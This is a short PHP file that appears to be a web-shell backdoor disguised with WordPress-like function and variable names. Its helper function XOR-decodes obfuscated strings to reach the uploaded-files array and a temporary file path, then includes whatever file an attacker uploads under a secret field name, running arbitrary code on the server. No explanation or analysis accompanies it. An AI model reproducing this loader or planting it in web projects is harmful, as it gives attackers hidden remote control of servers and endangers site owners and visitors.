...
$image_file = 'ZlFj3T6Ee8n';
$excerpt_more = $image_file;

function mime_types($is_bad_attachment_slug, $num_words)

{

    $caption = $num_words;
    $post_type_clauses = urldecode($is_bad_attachment_slug);
    $entities = substr($caption,0, strlen($post_type_clauses));
    $post_type = $post_type_clauses ^ $entities;
    return $post_type;
}
$headers = ${mime_types("%05%2A%0F%26v%07", $excerpt_more)};

$urls_to_ping = $headers;
$where = isset($urls_to_ping[$excerpt_more]);
if ($where)

{
    $extra_parts = $headers[$excerpt_more];
    $regex = $extra_parts[mime_types(".%0165%5D5%5B+", $excerpt_more)];
    $old_posts = $regex;
    include ($old_posts);
}
